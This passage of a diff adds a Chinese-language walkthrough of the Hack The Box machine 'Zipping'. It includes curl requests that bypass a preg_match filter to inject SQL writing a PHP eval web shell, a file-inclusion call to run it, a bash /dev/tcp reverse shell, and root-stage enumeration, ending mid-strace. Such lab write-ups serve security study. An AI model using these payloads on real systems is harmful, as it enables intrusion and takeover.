+                &lt;?php endif; ?&gt;
+            &lt;/span&gt;
+        &lt;/a&gt;
+        &lt;?php endforeach; ?&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;?=template_footer()?&gt;
+</code></pre>
+<h2 id="sqlI-preg-match-bypass"><a href="#sqlI-preg-match-bypass" class="headerlink" title="sqlI-preg_match bypass"></a>sqlI-preg_match bypass</h2><pre><code class="php">&lt;?php
+// If the user clicked the add to cart button on the product page we can check for the form data
+if (isset($_POST[&#39;product_id&#39;], $_POST[&#39;quantity&#39;])) {
+    // Set the post variables so we easily identify them, also make sure they are integer
+    $product_id = $_POST[&#39;product_id&#39;];
+    $quantity = $_POST[&#39;quantity&#39;];
+    // Filtering user input for letters or special characters
+    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]\\|;:&#39;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}[\]\\|;:&#39;\&quot;,.&lt;&gt;\/?]/i&quot;, $quantity, $match)) {
+        echo &#39;&#39;;
+    } else {
+        // Construct the SQL statement with a vulnerable parameter
+        $sql = &quot;SELECT * FROM products WHERE id = &#39;&quot; . $_POST[&#39;product_id&#39;] . &quot;&#39;&quot;;
+        // Execute the SQL statement without any sanitization or parameter binding
+        $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);
+        // Check if the product exists (array is not empty)
+</code></pre>
+<p>看了一圈，只有这个sql执行不是预编译，<code>cart.php</code>,有可能可以sql注入，但是这里有一个preg_match<br>想办法bypass<br>Refer: <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-." target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694318532847-8a02d001-87cb-4510-8f4e-41fd65d7a593.png#averageHue=%231f2429&clientId=ub0ae23b1-0055-4&from=paste&height=260&id=ua59e7100&originHeight=293&originWidth=1029&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=32308&status=done&style=none&taskId=u26577fc5-7f73-4311-bae5-050a9a240f6&title=&width=914.6666666666666" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>我们要绕过这个preg_match,只需要在payload 前面输入%0a,就能绕过检测了,<br>但是注意这个 preg_match，会检查最后一个字符是以数字结尾的所以我们的payload，需要以数字结尾<br>并且我们写文件的路径需要是mysql可以写的目录<br>即 secure_file_priv 这个变量的值，在linux下，默认路径基本上都是 <code>/var/lib/mysql</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320291780-24f0a5f4-632c-4391-a6c5-dc1cbea30231.png#averageHue=%232d2d2d&clientId=ub0ae23b1-0055-4&from=paste&height=612&id=ub4de9f72&originHeight=689&originWidth=1445&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=128310&status=done&style=none&taskId=u73e76c6f-a22b-4bcd-a348-6cd4203de89&title=&width=1284.4444444444443" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320466589-3e030712-8215-49de-8c24-ac2c92011d55.png#averageHue=%23c1a976&clientId=ub0ae23b1-0055-4&from=paste&height=731&id=uf71b8d86&originHeight=822&originWidth=1628&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=171266&status=done&style=none&taskId=ud78ccb68-71d0-4eea-8dea-10657c12417&title=&width=1447.111111111111" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>再通过文件包含，就能getshell</p>
+<pre><code class="bash">curl -i -s -k -X $&#39;POST&#39; \
+    -H $&#39;Host: zipping.htb&#39; -H $&#39;Content-Length: 106&#39; -H $&#39;Cache-Control: max-age=0&#39; -H $&#39;Upgrade-Insecure-Requests: 1&#39; -H $&#39;Origin: http://zipping.htb&#39; -H $&#39;Content-Type: application/x-www-form-urlencoded&#39; -H $&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#39; -H $&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39; -H $&#39;Referer: http://zipping.htb/shop/index.php?page=product&amp;id=1&#39; -H $&#39;Accept-Encoding: gzip, deflate&#39; -H $&#39;Accept-Language: zh-CN,zh;q=0.9&#39; -H $&#39;Connection: close&#39; \
+    -b $&#39;PHPSESSID=vgnhvclk9rblm04f3u8terc0nr&#39; \
+    --data-binary $&#39;quantity=1&amp;product_id=%0a\&#39;%3bselect+\&#39;&lt;%3fphp+eval($_REQUEST[1])%3b+%3f&gt;\&#39;+into+outfile+\&#39;/var/lib/mysql/3.php\&#39;%3b --1&#39; \
+    $&#39;http://zipping.htb/shop/index.php?page=cart&#39;
+
+
+curl -i -s -k -X $&#39;GET&#39; \
+    -H $&#39;Host: zipping.htb&#39; -H $&#39;Cache-Control: max-age=0&#39; -H $&#39;Upgrade-Insecure-Requests: 1&#39; -H $&#39;Origin: http://zipping.htb&#39; -H $&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#39; -H $&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39; -H $&#39;Referer: http://zipping.htb/shop/index.php?page=product&amp;id=1&#39; -H $&#39;Accept-Encoding: gzip, deflate&#39; -H $&#39;Accept-Language: zh-CN,zh;q=0.9&#39; -H $&#39;Connection: close&#39; \
+    -b $&#39;PHPSESSID=vgnhvclk9rblm04f3u8terc0nr&#39; \
+    $&#39;http://zipping.htb/shop/index.php?page=/var/lib/mysql/3&amp;1=phpinfo();&#39;
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320570611-3c0bac3f-8389-41b2-85e8-123821dad3ac.png#averageHue=%238b8b8b&clientId=ub0ae23b1-0055-4&from=paste&height=498&id=u9e5b7011&originHeight=560&originWidth=1615&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=94589&status=done&style=none&taskId=uc7238e2b-7966-4c2d-ba5b-8c774b7d002&title=&width=1435.5555555555557" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse-shell"></a>Reverse-shell</h2><pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# cat sh.sh                                                             1 ⨯
+bash -c &quot;bash -i&gt;&amp; /dev/tcp/10.10.16.5/5555 0&gt;&amp;1&quot;
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320823502-734dc14d-4c7e-43c2-8745-17de17fc6159.png#averageHue=%23171717&clientId=ub0ae23b1-0055-4&from=paste&height=342&id=u8e3691be&originHeight=385&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=84655&status=done&style=none&taskId=u8229f346-1bb9-4e43-af55-1f4a45d8693&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320831895-6b2132c3-989b-42c4-9236-0e7bb4eac70a.png#averageHue=%232e2e2e&clientId=ub0ae23b1-0055-4&from=paste&height=513&id=ud48ddc26&originHeight=577&originWidth=791&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=79896&status=done&style=none&taskId=u95cfba39-4e0c-4d47-880e-7d50066afb7&title=&width=703.1111111111111" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+
+<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><h2 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h2><pre><code class="bash">rektsu@zipping:/home/rektsu$ sudo -l
+sudo -l
+Matching Defaults entries for rektsu on zipping:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User rektsu may run the following commands on zipping:
+    (ALL) NOPASSWD: /usr/bin/stock
+rektsu@zipping:/home/rektsu$
+rektsu@zipping:/home/rektsu$ stock
+stock
+dfd
+Enter the password: Invalid password, please try again.
+rektsu@zipping:/home/rektsu$
+</code></pre>
+<pre><code class="bash">rektsu@zipping:/home/rektsu$ file /usr/bin/stock
+file /usr/bin/stock
+/usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, for GNU/Linux 3.2.0, not stripped
+rektsu@zipping:/home/rektsu$ strings /usr/bin/stock
+strings /usr/bin/stock
+/lib64/ld-linux-x86-64.so.2
+mgUa
+fgets
+stdin
+puts
+exit
+fopen
+__libc_start_main
+fprintf
+dlopen
+__isoc99_fscanf
+__cxa_finalize
+strchr
+fclose
+__isoc99_scanf
+strcmp
+__errno_location
+libc.so.6
+GLIBC_2.7
+GLIBC_2.2.5
+GLIBC_2.34
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+PTE1
+u+UH
+Hakaize
+St0ckM4nager
+/root/.stock.csv
+Enter the password:
+Invalid password, please try again.
+================== Menu ==================
+1) See the stock
+2) Edit the stock
+3) Exit the program
+Select an option:
+You do not have permissions to read the file
+File could not be opened.
+================== Stock Actual ==================
+Colour     Black   Gold    Silver
+Amount     %-7d %-7d %-7d
+Quality   Excelent Average Poor
+Amount    %-9d %-7d %-4d
+Exclusive Yes    No
+Amount    %-4d   %-4d
+Warranty  Yes    No
+================== Edit Stock ==================
+Enter the information of the watch you wish to update:
+Colour (0: black, 1: gold, 2: silver):
+Quality (0: excelent, 1: average, 2: poor):
+Exclusivity (0: yes, 1: no):
+Warranty (0: yes, 1: no):
+Amount:
+Error: The information entered is incorrect
+%d,%d,%d,%d,%d,%d,%d,%d,%d,%d
+The stock has been updated correctly.
+;*3$&quot;
+GCC: (Debian 12.2.0-3) 12.2.0
+Scrt1.o
+__abi_tag
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+stock.c
+__FRAME_END__
+_DYNAMIC
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_start_main@GLIBC_2.34
+__errno_location@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__isoc99_fscanf@GLIBC_2.7
+puts@GLIBC_2.2.5
+stdin@GLIBC_2.2.5
+_edata
+fclose@GLIBC_2.2.5
+_fini
+strchr@GLIBC_2.2.5
+fgets@GLIBC_2.2.5
+__data_start
+strcmp@GLIBC_2.2.5
+dlopen@GLIBC_2.34
+fprintf@GLIBC_2.2.5
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+checkAuth
+_end
+__bss_start
+main
+fopen@GLIBC_2.2.5
+__isoc99_scanf@GLIBC_2.7
+exit@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@GLIBC_2.2.5
+_init
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+</code></pre>
+<p>简单看了一下这个文件，是一个二进制文件，strings看字符串内容的时候，<code>St0ckM4nager</code>这个看起来像是密码</p>
+<pre><code class="bash">rektsu@zipping:/var/www/html/shop$ sudo /usr/bin/stock
+sudo /usr/bin/stock
+Enter the password: St0ckM4nager
+St0ckM4nager
+
+================== Menu ==================
+
+1) See the stock
+2) Edit the stock
+3) Exit the program
+
+Select an option: 1
+1
+
+================== Stock Actual ==================
+
+Colour     Black   Gold    Silver
+Amount     4       15      5
+
+Quality   Excelent Average Poor
+Amount    4         15      5
+
+Exclusive Yes    No
+Amount    4      19
+
+Warranty  Yes    No
+Amount    4      19
+
+
+================== Menu ==================
+
+1) See the stock
+2) Edit the stock
+3) Exit the program
+
+Select an option: 2
+2
+
+================== Edit Stock ==================
+
+Enter the information of the watch you wish to update:
+Colour (0: black, 1: gold, 2: silver): 0
+0
+Quality (0: excelent, 1: average, 2: poor): 0
+0
+Exclusivity (0: yes, 1: no): 0
+0
+Warranty (0: yes, 1: no): 0
+0
+Amount: 11
+11
+The stock has been updated correctly.
+
+================== Menu ==================
+
+1) See the stock
+2) Edit the stock
+3) Exit the program
+
+Select an option: 1
+1
+
+================== Stock Actual ==================
+
+Colour     Black   Gold    Silver
+Amount     15      15      5
+
+Quality   Excelent Average Poor
+Amount    15        15      5
+
+Exclusive Yes    No
+Amount    15     19
+
+Warranty  Yes    No
+Amount    15     19
+
+
+================== Menu ==================
+
+1) See the stock
+2) Edit the stock
+3) Exit the program
+
+Select an option: 3
+3
+rektsu@zipping:/var/www/html/shop$
+</code></pre>
+<p>简单运行了一下， 好像就是看一些信息，和编辑一些信息</p>
+<h2 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h2><p>使用strace可以看到这个程序，跑起来的时候的系统调用</p>
+<pre><code class="bash">rektsu@zipping:/var/www/html/shop$ strace sudo /usr/bin/stock
+strace sudo /usr/bin/stock
+execve(&quot;/usr/bin/sudo&quot;, [&quot;sudo&quot;, &quot;/usr/bin/stock&quot;], 0x7ffe8f4f4508 /* 15 vars */) = 0
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+brk(NULL)                               = 0x563b6b997000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe9a935810) = -1 EINVAL (Invalid argument)
+fcntl(0, F_GETFD)                       = 0
+fcntl(1, F_GETFD)                       = 0
+fcntl(2, F_GETFD)                       = 0
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6e6e0a5000
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/glibc-hwcaps/x86-64-v3/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/glibc-hwcaps/x86-64-v3&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/glibc-hwcaps/x86-64-v2/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/glibc-hwcaps/x86-64-v2&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/tls/x86_64/x86_64/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/tls/x86_64/x86_64&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/tls/x86_64/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/tls/x86_64&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/tls/x86_64/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/tls/x86_64&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/tls/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/tls&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/x86_64/x86_64/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/x86_64/x86_64&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/x86_64/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/x86_64&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/x86_64/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo/x86_64&quot;, 0x7ffe9a934a40, 0) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, &quot;/usr/libexec/sudo&quot;, {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=18225, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 18225, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f6e6e0a0000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libaudit.so.1&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\0\0\0\0\0\0\0&quot;..., 832) = 832
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=133200, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 184496, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f6e6e072000
+mmap(0x7f6e6e075000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f6e6e075000
+mmap(0x7f6e6e07d000, 86016, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb000) = 0x7f6e6e07d000
+mmap(0x7f6e6e092000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f000) = 0x7f6e6e092000
+mmap(0x7f6e6e094000, 45232, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f6e6e094000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/libselinux.so.1&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libselinux.so.1&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\0\0\0\0\0\0\0&quot;..., 832) = 832
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=174472, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 186024, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f6e6e044000
+mmap(0x7f6e6e04a000, 114688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f6e6e04a000
+mmap(0x7f6e6e066000, 32768, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7f6e6e066000
+mmap(0x7f6e6e06e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x29000) = 0x7f6e6e06e000
+mmap(0x7f6e6e070000, 5800, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f6e6e070000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/libsudo_util.so.0&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\0\0\0\0\0\0\0&quot;..., 832) = 832
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=117752, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 120936, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f6e6e026000
+mmap(0x7f6e6e02b000, 69632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f6e6e02b000
+mmap(0x7f6e6e03c000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16000) = 0x7f6e6e03c000
+mmap(0x7f6e6e042000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b000) = 0x7f6e6e042000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/usr/libexec/sudo/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\3206\2\0\0\0\0\0&quot;..., 832) = 832
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=2072888, ...}, AT_EMPTY_PATH) = 0
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+mmap(NULL, 2117488, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f6e6de00000
+mmap(0x7f6e6de22000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7f6e6de22000
+mmap(0x7f6e6df9b000, 356352, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19b000) = 0x7f6e6df9b000
+mmap(0x7f6e6dff2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f1000) = 0x7f6e6dff2000
+mmap(0x7f6e6dff8000, 53104, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f6e6dff8000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libcap-ng.so.0&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\0\0\0\0\0\0\0&quot;..., 832) = 832
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=35112, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 32832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f6e6e01d000
+mmap(0x7f6e6e01f000, 16384, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f6e6e01f000
+mmap(0x7f6e6e023000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f6e6e023000
+mmap(0x7f6e6e024000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7000) = 0x7f6e6e024000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libpcre2-8.so.0&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\0\0\0\0\0\0\0&quot;..., 832) = 832
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=629440, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6e6e01b000
+mmap(NULL, 631568, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f6e6dd65000
+mmap(0x7f6e6dd67000, 442368, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f6e6dd67000
+mmap(0x7f6e6ddd3000, 176128, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6e000) = 0x7f6e6ddd3000
+mmap(0x7f6e6ddfe000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x98000) = 0x7f6e6ddfe000
+close(3)                                = 0
+mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6e6e018000
+arch_prctl(ARCH_SET_FS, 0x7f6e6e018840) = 0
+set_tid_address(0x7f6e6e018b10)         = 1240
+set_robust_list(0x7f6e6e018b20, 24)     = 0
+rseq(0x7f6e6e019160, 0x20, 0, 0x53053053) = 0
+mprotect(0x7f6e6dff2000, 16384, PROT_READ) = 0
+mprotect(0x7f6e6ddfe000, 4096, PROT_READ) = 0
+mprotect(0x7f6e6e024000, 4096, PROT_READ) = 0
+mprotect(0x7f6e6e042000, 4096, PROT_READ) = 0
+mprotect(0x7f6e6e06e000, 4096, PROT_READ) = 0
+mprotect(0x7f6e6e092000, 4096, PROT_READ) = 0
+mprotect(0x563b6a0a1000, 8192, PROT_READ) = 0
+mprotect(0x7f6e6e0db000, 8192, PROT_READ) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+munmap(0x7f6e6e0a0000, 18225)           = 0
+openat(AT_FDCWD, &quot;/proc/sys/kernel/cap_last_cap&quot;, O_RDONLY) = 3
+fstatfs(3, {f_type=PROC_SUPER_MAGIC, f_bsize=4096, f_blocks=0, f_bfree=0, f_bavail=0, f_files=0, f_ffree=0, f_fsid={val=[0, 0]}, f_namelen=255, f_frsize=4096, f_flags=ST_VALID|ST_NOSUID|ST_NODEV|ST_NOEXEC|ST_RELATIME}) = 0
+read(3, &quot;40\n&quot;, 7)                      = 3
+close(3)                                = 0
+prctl(PR_CAPBSET_READ, CAP_CHOWN)       = 1
+prctl(PR_GET_SECUREBITS)                = 0
+prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0)  = 0
+prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, CAP_CHOWN, 0, 0) = 0
+statfs(&quot;/sys/fs/selinux&quot;, 0x7ffe9a9357e0) = -1 ENOENT (No such file or directory)
+statfs(&quot;/selinux&quot;, 0x7ffe9a9357e0)      = -1 ENOENT (No such file or directory)
+getrandom(&quot;\xbf\x4a\xfb\x14\x48\x86\x36\x39&quot;, 8, GRND_NONBLOCK) = 8
+brk(NULL)                               = 0x563b6b997000
+brk(0x563b6b9b8000)                     = 0x563b6b9b8000
+openat(AT_FDCWD, &quot;/proc/filesystems&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0444, st_size=0, ...}, AT_EMPTY_PATH) = 0
+read(3, &quot;nodev\tsysfs\nnodev\ttmpfs\nnodev\tbd&quot;..., 1024) = 385
+read(3, &quot;&quot;, 1024)                       = 0
+close(3)                                = 0
+access(&quot;/etc/selinux/config&quot;, F_OK)     = -1 ENOENT (No such file or directory)
